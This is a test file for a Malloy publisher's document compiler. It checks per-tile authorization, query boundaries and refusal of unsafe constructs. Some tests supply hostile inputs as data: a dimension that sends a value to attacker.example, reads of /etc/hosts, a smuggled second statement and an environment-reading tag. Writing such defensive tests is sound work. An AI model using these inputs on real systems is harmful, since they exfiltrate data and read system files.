// Copyright (c) Credible Data Inc.
// SPDX-License-Identifier: MIT

import { type GivenValue } from "@malloydata/malloy";
import { afterEach, beforeEach, describe, expect, it } from "bun:test";
import fs from "fs/promises";
import os from "os";
import path from "path";
import { DuckDBConnection } from "@malloydata/db-duckdb";
import { Runtime } from "@malloydata/malloy";
import {
   AccessDeniedError,
   CompileRefusedError,
   NotQueryableError,
} from "../errors";
import {
   startMetricsHarness,
   type MetricsHarness,
} from "../test_helpers/metrics_harness";
import {
   blankSpans,
   compileDocument,
   type CompiledDocument,
} from "./compile_document";
import type { NotebookCellSpan } from "./notebook";
import type { DashboardQueryTileSpec } from "./dashboard";
import { Environment, resetAdmissionTelemetryForTesting } from "./environment";

const manifestOf = (result: { document?: CompiledDocument }) => {
   if (!result.document?.manifest) throw new Error("no manifest");
   return result.document.manifest;
};
const tilesOf = (result: { document?: CompiledDocument }) =>
   (manifestOf(result).tiles ?? []) as DashboardQueryTileSpec[];

// Compile of a source that carries a model-level `## artifact` tag answers with
// the document it describes. Driven through a real installed package.

const MODEL = `##! experimental.givens
## base note, which a document must never inherit
## artifact { kind=dashboard title="Base" }

given:
  ROLE :: string
  REGION :: filter<string> is f''

#(secure)
given: TENANT :: string is 'w'

#(authorize) 'analyst' = $ROLE
source: gated is duckdb.sql("SELECT 1 as x, 'w' as region") extend {
  measure: c is count()
  # label="Gated total"
  view: v is { aggregate: c }
}

source: open_src is duckdb.sql("SELECT 1 as x, 'w' as region") extend {
  measure: c is count()
  view: v is { aggregate: c where: region ~ $REGION }
  view: sv is { aggregate: c where: region = $TENANT }
}

run: open_src -> { aggregate: c }
`;

const DOC_TILES = `## artifact { kind=dashboard tiles=["open_src -> v", "gated -> v"] }
`;

describe("compile of a document (compileSource)", () => {
   let rootDir: string;
   let env: Environment;

   async function install(
      files: Record<string, string>,
      manifest: Record<string, unknown> = {},
   ) {
      await env.installPackage("pkg", async (stagingPath) => {
         await fs.mkdir(stagingPath, { recursive: true });
         await fs.writeFile(
            path.join(stagingPath, "publisher.json"),
            JSON.stringify({ name: "pkg", description: "doc", ...manifest }),
         );
         for (const [name, text] of Object.entries(files)) {
            await fs.writeFile(path.join(stagingPath, name), text);
         }
      });
   }

   beforeEach(async () => {
      rootDir = await fs.mkdtemp(path.join(os.tmpdir(), "publisher-doc-"));
      const envPath = path.join(rootDir, "env");
      await fs.mkdir(envPath, { recursive: true });
      env = await Environment.create("testEnv", envPath, []);
   });

   afterEach(async () => {
      await fs.rm(rootDir, { recursive: true, force: true }).catch(() => {});
   });

   const compile = (source: string, givens?: Record<string, GivenValue>) =>
      env.compileSource("pkg", "model.malloy", source, false, givens);

   describe("fragment isolation", () => {
      beforeEach(async () => {
         await install({ "model.malloy": MODEL });
      });

      it("reads only the submitted text: the base's run: and ## notes never join the document", async () => {
         const { problems, document } = await compile(
            `## artifact { kind=notebook }
##(markdown) Hello
run: open_src -> { aggregate: c }
`,
         );
         expect(problems.filter((p) => p.severity === "error")).toEqual([]);
         expect(document?.kind).toBe("notebook");
         // The base declares a dashboard tag of its own; none of it reaches the document.
         expect(document?.manifest).toBeUndefined();
         expect(document?.cells.map((c) => [c.kind, c.restricted])).toEqual([
            ["markdown", undefined],
            ["query", undefined],
         ]);
      });

      it("reads the kind from the tag, and from the layout when the tag names none", async () => {
         const kindOf = async (source: string) =>
            (await compile(source)).document?.kind;
         // Submitted text has no folder to take a kind from, so the layout decides.
         expect(await kindOf(`## artifact { tiles=["open_src -> v"] }\n`)).toBe(
            "dashboard",
         );
         expect(
            await kindOf(`## artifact { } dashboard { columns=12 }\n`),
         ).toBe("dashboard");
         expect(
            await kindOf(
               `## artifact { }\nrun: open_src -> { aggregate: c }\n`,
            ),
         ).toBe("notebook");
         expect(
            await kindOf(
               `## artifact { kind=notebook tiles=["open_src -> v"] }\n`,
            ),
         ).toBe("notebook");
         expect(
            await kindOf(
               `## artifact { kind=dashboard }\nrun: open_src -> { aggregate: c }\n`,
            ),
         ).toBe("dashboard");
         const dashboard = await compile(
            DOC_TILES.replace("gated -> v", "open_src -> v"),
         );
         expect(tilesOf(dashboard)).toHaveLength(2);
      });

      it("reads the control row off the compiled tiles and does not run anything", async () => {
         const result = await compile(
            `## artifact { kind=dashboard tiles=["open_src -> v"] }\n`,
         );
         expect(tilesOf(result)[0].givenNames).toEqual(["REGION"]);
         expect(manifestOf(result).givens?.map((g) => g.name)).toEqual([
            "REGION",
         ]);
      });

      it("marks a #(secure) given so a host can withhold its control", async () => {
         const result = await compile(
            `## artifact { kind=dashboard tiles=["open_src -> sv"] }\n`,
         );
         const row = manifestOf(result).givens ?? [];
         expect(row.map((g) => [g.name, g.secure])).toEqual([["TENANT", true]]);
      });

      it("answers a source that is not a document as it always did", async () => {
         const result = await compile("run: open_src -> { aggregate: c }");
         expect(result.document).toBeUndefined();
         expect(result.problems).toEqual([]);
      });
   });

   describe("per-cell and per-tile authorize", () => {
      beforeEach(async () => {
         await install({ "model.malloy": MODEL });
      });

      it("a member sees every tile unrestricted", async () => {
         const tiles = tilesOf(await compile(DOC_TILES, { ROLE: "analyst" }));
         expect(tiles.map((t) => t.restricted)).toEqual([undefined, undefined]);
         expect(tiles[1].label).toBe("Gated total");
      });

      it("serves a manifest with no path: the host runs the text on the model it compiled against", async () => {
         const manifest = manifestOf(
            await compile(DOC_TILES, { ROLE: "analyst" }),
         );
         expect(manifest).not.toHaveProperty("path");
         expect(manifest.name).toBe("model");
      });

      it("a non-member gets the gated tile bare and the rest compiled", async () => {
         const result = await compile(DOC_TILES, { ROLE: "nobody" });
         const { problems } = result;
         const tiles = tilesOf(result);
         expect(tiles[0].restricted).toBeUndefined();
         expect(tiles[0].givenNames).toEqual(["REGION"]);
         expect(tiles[1]).toEqual({
            kind: "query",
            query: "gated -> v",
            restricted: true,
         });
         expect(problems).toEqual([]);
      });

      it("a non-member's gated cell is restricted and its diagnostics do not exist", async () => {
         const text = `## artifact { kind=notebook }
run: open_src -> { aggregate: c }
run: gated -> { select: no_such_column_in_gated }
`;
         const nonMember = await compile(text, { ROLE: "nobody" });
         expect(nonMember.problems).toEqual([]);
         expect(nonMember.document?.cells.map((c) => c.restricted)).toEqual([
            undefined,
            true,
         ]);
         const member = await compile(text, { ROLE: "analyst" });
         expect(member.problems.some((p) => p.severity === "error")).toBe(true);
      });

      it("restriction follows a derived name: a source defined from a gated one taints its readers", async () => {
         const text = `## artifact { kind=notebook }
source: derived is gated extend { measure: n is count() }
run: derived -> { aggregate: n }
run: open_src -> { aggregate: c }
`;
         const { document, problems } = await compile(text, { ROLE: "nobody" });
         expect(problems).toEqual([]);
         expect(document?.cells.map((c) => c.restricted)).toEqual([
            true,
            true,
            undefined,
         ]);
      });

      it("text that does not parse is refused by the construct gate before any cell is read", async () => {
         await expect(
            compile(
               `## artifact { kind=notebook }\nrun: open_src -> { aggregate: c }\nthis is not malloy\n`,
            ),
         ).rejects.toBeInstanceOf(CompileRefusedError);
      });
   });

   describe("a tile over a source with a row-level gate", () => {
      beforeEach(async () => {
         await install({
            "model.malloy": `##! experimental.givens
given:
  TENANTS :: string[]
#(access_filter) tenant in $TENANTS
source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
  measure: c is count()
  view: v is { aggregate: c }
}
`,
         });
      });

      const tile = `## artifact { tiles=["secured -> v"] }\n`;

      it("is restricted when the request does not carry the gate's given, as every viewer of a host that never sends it", async () => {
         expect(tilesOf(await compile(tile))[0].restricted).toBe(true);
      });

      it("is not restricted when the request carries it", async () => {
         const tiles = tilesOf(await compile(tile, { TENANTS: ["acme"] }));
         expect(tiles[0].restricted).toBeUndefined();
      });
   });

   describe("data roots a document may not declare", () => {
      beforeEach(async () => {
         await install({ "model.malloy": MODEL });
      });

      const roots = [
         "duckdb.table('/etc/hosts')",
         "duckdb.sql('select 1 as region')",
      ];

      for (const root of roots) {
         it(`refuses a tile over ${root}, so no givenNames or givens row can answer for it`, async () => {
            await expect(
               compile(
                  `## artifact { kind=dashboard tiles=["${root} -> { select: region }"] }\n`,
                  { ROLE: "analyst" },
               ),
            ).rejects.toBeInstanceOf(CompileRefusedError);
         });

         it(`the whole-text gate refuses a cell over ${root}`, async () => {
            await expect(
               compile(
                  `## artifact { kind=notebook }\nrun: ${root} -> { select: region }\n`,
                  { ROLE: "analyst" },
               ),
            ).rejects.toBeInstanceOf(CompileRefusedError);
         });
      }

      it("the whole-text gate refuses a definition cell that declares a root, so the tile over it never compiles", async () => {
         await expect(
            compile(
               `## artifact { kind=dashboard tiles=["d -> v"] }\nsource: d is duckdb.table('/etc/hosts') extend { view: v is { select: * } }\n`,
            ),
         ).rejects.toBeInstanceOf(CompileRefusedError);
      });

      it("refuses a definition cell that turns a value into a URL with a render tag", async () => {
         await expect(
            compile(
               `## artifact { kind=dashboard tiles=["leaky -> v"] }\nsource: leaky is open_src extend {\n  dimension: # image\n    pic is concat('https://attacker.example/?', region)\n  view: v is { group_by: pic }\n}\n`,
               { ROLE: "analyst" },
            ),
         ).rejects.toBeInstanceOf(CompileRefusedError);
      });

      it("refuses a definition cell whose render tag reads the environment, which hides the tag from a plain parse", async () => {
         await expect(
            compile(
               `## artifact { kind=dashboard tiles=["leaky -> v"] }\nsource: leaky is open_src extend {\n  dimension:\n  # image=@env.HOME\n  pic is region\n  view: v is { group_by: pic }\n}\n`,
               { ROLE: "analyst" },
            ),
         ).rejects.toBeInstanceOf(CompileRefusedError);
      });

      it("keeps a document whose cell carries the documented bare filter literal in a starting-value tag", async () => {
         const result = await compile(
            `## artifact { kind=notebook }\n# artifact { autorun=false givens { REGION=f'US' } }\nrun: open_src -> { aggregate: c }\n`,
            { ROLE: "analyst" },
         );
         expect(result.document?.cells.map((c) => c.kind)).toEqual(["query"]);
      });

      it("leaves an ordinary tile's givens exactly as they were", async () => {
         const result = await compile(
            `## artifact { kind=dashboard tiles=["open_src -> v"] }\n`,
         );
         expect(tilesOf(result)[0].givenNames).toEqual(["REGION"]);
         expect(manifestOf(result).givens?.map((g) => g.name)).toEqual([
            "REGION",
         ]);
      });
   });

   describe("tile expressions at the construct gate", () => {
      let harness: MetricsHarness;

      beforeEach(async () => {
         await install({ "model.malloy": MODEL });
         harness = await startMetricsHarness();
         resetAdmissionTelemetryForTesting();
      });

      afterEach(async () => {
         resetAdmissionTelemetryForTesting();
         await harness.shutdown();
      });

      const refusals = () =>
         harness.collectCounter("publisher_compile_refusals_total", {
            reason: "restricted_construct",
         });
      const tiles = (...expressions: string[]) =>
         `## artifact { kind=dashboard tiles=[${expressions
            .map((e) => `"${e}"`)
            .join(", ")}] }\n`;
      const refusalOf = async (source: string) => {
         try {
            await compile(source, { ROLE: "analyst" });
         } catch (error) {
            if (error instanceof CompileRefusedError) return error.message;
            throw error;
         }
         throw new Error("expected a refusal");
      };

      it("answers a tile that does not parse with a problem and keeps the document", async () => {
         const result = await compile(tiles("open_src -> {", "open_src -> v"));
         expect(result.problems.map((p) => p.code)).toEqual([
            "tile-does-not-compile",
         ]);
         expect(result.problems[0].message).toContain("open_src -> {");
         expect(result.problems[0].message).toContain("Fix:");
         expect(tilesOf(result).map((t) => t.query)).toEqual([
            "open_src -> {",
            "open_src -> v",
         ]);
         expect(tilesOf(result)[1].givenNames).toEqual(["REGION"]);
         expect(await refusals()).toBe(0);
      });

      it("reports a tile that parses but names a view or a source that does not exist", async () => {
         for (const tile of ["open_src -> no_such_view", "nosuch -> v"]) {
            const result = await compile(tiles(tile, "open_src -> v"), {
               ROLE: "analyst",
            });
            expect(result.problems.map((p) => p.code)).toEqual([
               "tile-does-not-compile",
            ]);
            expect(result.problems[0].severity).toBe("error");
            expect(result.problems[0].message).toContain(tile);
            expect(result.problems[0].message).toContain("Fix:");
            expect(tilesOf(result).map((t) => t.query)).toEqual([
               tile,
               "open_src -> v",
            ]);
         }
      });

      it("counts a tile refused for a construct, with the same reason as the whole-text gate", async () => {
         await expect(
            compile(tiles("open_src -> { select: y is f!number(x) }")),
         ).rejects.toBeInstanceOf(CompileRefusedError);
         expect(await refusals()).toBe(1);
      });

      it("refuses a tile that uses a sql_ function", async () => {
         await expect(
            compile(tiles("open_src -> { select: y is sql_number('1') }")),
         ).rejects.toBeInstanceOf(CompileRefusedError);
      });

      it("refuses a tile that smuggles a second statement behind its query", async () => {
         await expect(
            compile(
               tiles(
                  "open_src -> v\\nsource: zz is duckdb.table('/etc/hosts')",
               ),
            ),
         ).rejects.toBeInstanceOf(CompileRefusedError);
      });

      it("gives an existing and a missing path the same refusal, so the message cannot say which exists", async () => {
         const existing = await refusalOf(
            tiles("duckdb.table('/etc/hosts') -> { select: region }"),
         );
         const missing = await refusalOf(
            tiles("duckdb.table('/no/such/file') -> { select: region }"),
         );
         expect(existing.replaceAll("/etc/hosts", "P")).toBe(
            missing.replaceAll("/no/such/file", "P"),
         );
      });
   });

   describe("restricted cells that share lines or names", () => {
      beforeEach(async () => {
         await install({ "model.malloy": MODEL });
      });

      it("blanks a restricted cell written with CRLF line endings", async () => {
         const { document, problems } = await compile(
            `## artifact { kind=notebook }\r\nrun: gated -> {\r\n  select: no_such_column_in_gated\r\n}\r\nrun: open_src -> { aggregate: c }\r\n`,
            { ROLE: "nobody" },
         );
         expect(problems).toEqual([]);
         expect(document?.cells.map((c) => c.restricted)).toEqual([
            true,
            undefined,
         ]);
      });

      it("blanks a restricted cell together with its annotations", async () => {
         const { document, problems } = await compile(
            `## artifact { kind=notebook }\n#(markdown) About the gated total\n# label="Gated"\nrun: gated -> { select: no_such_column_in_gated }\nrun: open_src -> { aggregate: c }\n`,
            { ROLE: "nobody" },
         );
         expect(problems).toEqual([]);
         expect(document?.cells.map((c) => c.restricted)).toEqual([
            true,
            undefined,
         ]);
      });

      it("taints every name of a multi-item declaration", async () => {
         const { document } = await compile(
            `## artifact { kind=notebook }\nsource: a is gated extend { }\nsource: b is gated extend { }, c is open_src extend { }\nrun: b -> { aggregate: c }\nrun: c -> { aggregate: c }\n`,
            { ROLE: "nobody" },
         );
         // `c` reads an open source, but its statement is blanked with `b`, so `c` no longer exists to read.
         expect(document?.cells.map((c) => c.restricted)).toEqual([
            true,
            true,
            true,
            true,
         ]);
      });

      it("taints a parameterized declaration's name", async () => {
         const { document } = await compile(
            `## artifact { kind=notebook }\nsource: p(n::number is 1) is gated extend { }\nrun: p(n is 2) -> { aggregate: c }\nrun: open_src -> { aggregate: c }\n`,
            { ROLE: "nobody" },
         );
         expect(document?.cells.map((c) => c.restricted)).toEqual([
            true,
            true,
            undefined,
         ]);
      });

      it("fails closed when a restricted cell has no recorded span", () => {
         expect(() => blankSpans("run: x", [{} as NotebookCellSpan])).toThrow(
            "no recorded span",
         );
      });

      it("blanks only the restricted statement, so an open one on its line still compiles", async () => {
         const { document, problems } = await compile(
            `## artifact { kind=notebook }\nsource: d is gated extend { } run: open_src -> {\n  aggregate: c\n}\n`,
            { ROLE: "nobody" },
         );
         expect(problems.filter((p) => p.code === "syntax-error")).toEqual([]);
         expect(document?.cells.map((c) => c.restricted)).toEqual([
            true,
            undefined,
         ]);
      });

      it("taints the statement's own name and not the fields declared inside it", async () => {
         const { document } = await compile(
            `## artifact { kind=notebook }\nsource: d is gated extend { measure: n is count() }\nrun: open_src -> { aggregate: n is count() }\nrun: d -> { aggregate: n }\n`,
            { ROLE: "nobody" },
         );
         expect(document?.cells.map((c) => c.restricted)).toEqual([
            true,
            undefined,
            true,
         ]);
      });

      it("taints a backtick-quoted name", async () => {
         const { document, problems } = await compile(
            `## artifact { kind=notebook }\nsource: \`d x\` is gated extend { }\nrun: \`d x\` -> { select: x }\nrun: open_src -> { aggregate: c }\n`,
            { ROLE: "nobody" },
         );
         expect(problems).toEqual([]);
         expect(document?.cells.map((c) => c.restricted)).toEqual([
            true,
            true,
            undefined,
         ]);
      });
   });

   describe("a control's suggest query", () => {
      beforeEach(async () => {
         await install({ "model.malloy": MODEL });
      });

      it("cannot be written by a document: a given, and so its suggest, is refused in document text", async () => {
         const error = await compile(
            `## artifact { tiles=["open_src -> v"] }\n#(control) suggest { query=anything }\ngiven: PICK :: string\n`,
            { ROLE: "analyst" },
         ).then(
            () => undefined,
            (caught: unknown) => caught,
         );
         expect(error).toBeInstanceOf(CompileRefusedError);
      });
   });

   describe("a tag that follows code on its line", () => {
      beforeEach(async () => {
         await install({ "model.malloy": MODEL });
      });

      it("makes the text a document, as it is when the file is saved", async () => {
         const { document } = await compile(
            `run: open_src -> { aggregate: c } ## artifact { kind=dashboard tiles=["open_src -> v"] }\n`,
            { ROLE: "analyst" },
         );
         expect(document?.kind).toBe("dashboard");
         expect(document?.manifest?.tiles).toHaveLength(1);
      });
   });

   describe("a tile over a name the viewer cannot confirm", () => {
      beforeEach(async () => {
         await install(
            {
               "index.malloy": `##! experimental.givens
given:
  ROLE :: string
source: customers is duckdb.sql("select 1 as id") extend {
  measure: c is count()
  view: v is { aggregate: c }
}
source: helper is duckdb.sql("select 1 as id") extend {
  measure: c is count()
  view: v is { aggregate: c }
}
#(authorize) 'analyst' = $ROLE
source: locked_hidden is duckdb.sql("select 1 as id") extend {
  measure: c is count()
  view: v is { aggregate: c }
}
export { customers }
`,
            },
            { explores: ["index.malloy"] },
         );
      });

      const refusal = async (
         tile: string,
         givens?: Record<string, string>,
         definitions = "",
      ) => {
         try {
            await env.compileSource(
               "pkg",
               "index.malloy",
               `## artifact { tiles=["${tile}"] }\n${definitions}`,
               false,
               givens,
            );
         } catch (error) {
            if (error instanceof NotQueryableError) return error.message;
            throw error;
         }
         throw new Error("expected a refusal");
      };

      it("gives a missing source and a hidden gated one the same refusal", async () => {
         const missing = await refusal("nosuch -> v");
         expect(await refusal("locked_hidden -> v")).toBe(missing);
         expect(await refusal("locked_hidden -> v", { ROLE: "analyst" })).toBe(
            missing,
         );
      });

      describe("a definition whose base is not one the caller can see", () => {
         const GENERIC = "Query target is not queryable.";
         const bases = ["nosuch", "helper", "locked_hidden"];
         for (const base of bases) {
            for (const used of [false, true]) {
               for (const givens of [undefined, { ROLE: "analyst" }]) {
                  it(`reads the same for ${base}, ${used ? "used" : "unused"}, ${givens ? "with" : "without"} the admitting role`, async () => {
                     expect(
                        await refusal(
                           used ? "d -> v" : "customers -> v",
                           givens,
                           `source: d is ${base} extend {}\n`,
                        ),
                     ).toBe(GENERIC);
                  });
               }
            }
         }

         it("still compiles a definition over a source the caller can see", async () => {
            const { document, problems } = await env.compileSource(
               "pkg",
               "index.malloy",
               `## artifact { tiles=["d -> v"] }\nsource: d is customers extend {}\n`,
            );
            expect(problems).toEqual([]);
            expect(document).toBeDefined();
         });

         it("gives a locked source reached through a definition the generic sentence, not one naming it", async () => {
            const hidden = await refusal(
               "d -> v",
               undefined,
               "source: d is locked_hidden\n",
            );
            const plain = await refusal(
               "d -> v",
               undefined,
               "source: d is helper\n",
            );
            expect(hidden).toBe(plain);
         });
      });

      it("reports a missing view on a source the viewer can read, as a tile problem", async () => {
         const { problems } = await env.compileSource(
            "pkg",
            "index.malloy",
            `## artifact { tiles=["customers -> no_such_view"] }\n`,
         );
         expect(problems.map((p) => p.code)).toEqual(["tile-does-not-compile"]);
      });
   });

   describe("query boundary", () => {
      beforeEach(async () => {
         await install(
            {
               "index.malloy": `source: helper is duckdb.sql("select 1 as id") extend {
  measure: c is count()
  view: hv is { aggregate: c }
}
source: customers is duckdb.sql("select 1 as id") extend {
  measure: c is count()
  view: v is { aggregate: c }
}
export { customers }
`,
            },
            { explores: ["index.malloy"] },
         );
      });

      it("refuses a document whose tile targets a source off the surface, so a compile that passes also runs", async () => {
         const { document, problems } = await env.compileSource(
            "pkg",
            "index.malloy",
            `## artifact { tiles=["helper -> hv"] }\n`,
         );
         expect(document).toBeUndefined();
         expect(problems.map((p) => p.code)).toEqual(["query-not-queryable"]);
      });

      it("refuses a tile or cell that reaches a hidden source only through a derivation the document defines", async () => {
         const tile = await env.compileSource(
            "pkg",
            "index.malloy",
            `## artifact { tiles=["h2 -> hv"] }\nsource: h2 is helper extend { }\n`,
         );
         expect(tile.document).toBeUndefined();
         expect(tile.problems.map((p) => p.code)).toEqual([
            "query-not-queryable",
         ]);
         const cell = await env.compileSource(
            "pkg",
            "index.malloy",
            `## artifact { kind=notebook }\nsource: h2 is helper extend { }\nrun: h2 -> { aggregate: c }\n`,
         );
         expect(cell.document).toBeUndefined();
         expect(cell.problems.map((p) => p.code)).toEqual([
            "query-not-queryable",
         ]);
      });

      it("refuses a tile or cell whose own definition joins a hidden source, so a compile that passes also runs", async () => {
         const definition = `source: j is customers extend { join_one: st is helper on id = st.id }\n`;
         const tile = await env.compileSource(
            "pkg",
            "index.malloy",
            `## artifact { tiles=["j -> {group_by: st.id; aggregate: n is count()}"] }\n${definition}`,
         );
         expect(tile.document).toBeUndefined();
         expect(tile.problems.map((p) => p.code)).toEqual([
            "query-not-queryable",
         ]);
         const cell = await env.compileSource(
            "pkg",
            "index.malloy",
            `## artifact { kind=notebook }\n${definition}run: j -> { group_by: st.id }\n`,
         );
         expect(cell.document).toBeUndefined();
         expect(cell.problems.map((p) => p.code)).toEqual([
            "query-not-queryable",
         ]);
      });

      it("refuses an inline join to a hidden source in the tile itself", async () => {
         const { document, problems } = await env.compileSource(
            "pkg",
            "index.malloy",
            `## artifact { tiles=["customers extend { join_one: st is helper on id = st.id } -> { group_by: st.id }"] }\n`,
         );
         expect(document).toBeUndefined();
         expect(problems.map((p) => p.code)).toEqual(["query-not-queryable"]);
      });

      it("admits a definition that joins an exported source", async () => {
         const result = await env.compileSource(
            "pkg",
            "index.malloy",
            `## artifact { tiles=["j -> {group_by: o.id; aggregate: n is count()}"] }\nsource: j is customers extend { join_one: o is customers on id = o.id }\n`,
         );
         expect(result.problems).toEqual([]);
         expect(tilesOf(result)).toHaveLength(1);
      });

      it("admits a document whose tiles read the surface", async () => {
         const result = await env.compileSource(
            "pkg",
            "index.malloy",
            `## artifact { tiles=["customers -> v"] }\n`,
         );
         expect(result.problems).toEqual([]);
         expect(tilesOf(result)).toHaveLength(1);
      });
   });
});

describe("compileDocument's compiled authorize backstop", () => {
   // The text gate is name-based; this drives the second line of defence alone,
   // by letting every name through the text gate and denying at the runnable.
   const url = "file:///base.malloy";
   const files: Record<string, string> = {
      [url]: `source: s is duckdb.sql("select 1 as a") extend {
  measure: c is count()
  view: v is { aggregate: c }
}
source: t is duckdb.sql("select 1 as a") extend {
  measure: c is count()
  view: v is { aggregate: c }
}
`,
   };

   const run = async (denySource: string) => {
      const connection = new DuckDBConnection("duckdb", ":memory:");
      const runtime = new Runtime({
         urlReader: { readURL: async (u: URL) => files[u.toString()] },
         connection,
      });
      const denied: string[] = [];
      try {
         return await compileDocument({
            base: runtime.loadModel(new URL(url)),
            source:
               '## artifact { kind=notebook tiles=["s -> v", "t -> v"] }\n',
            modelName: "model.malloy",
            gates: {
               text: async () => {},
               constructs: async () => {},
               nameVisible: () => {},
               boundary: async () => {},
               boundaryCompiled: async () => {},
               compiled: async (runnable) => {
                  const prepared = (await runnable.getPreparedQuery()) as {
                     _query?: { structRef?: unknown };
                  };
                  const ref = prepared._query?.structRef;
                  const name = typeof ref === "string" ? ref : "";
                  denied.push(name);
                  if (name === denySource) throw new AccessDeniedError("no");
               },
            },
         });
      } finally {
         await connection.close();
      }
   };

   it("restricts the tile whose compiled source is denied, bare, and leaves the other", async () => {
      const result = await run("s");
      const tiles = (result?.document?.manifest?.tiles ??
         []) as DashboardQueryTileSpec[];
      expect(tiles[0]).toEqual({
         kind: "query",
         query: "s -> v",
         restricted: true,
      });
      expect(tiles[1].restricted).toBeUndefined();
      expect(tiles[1].givenNames).toEqual([]);
   });
});
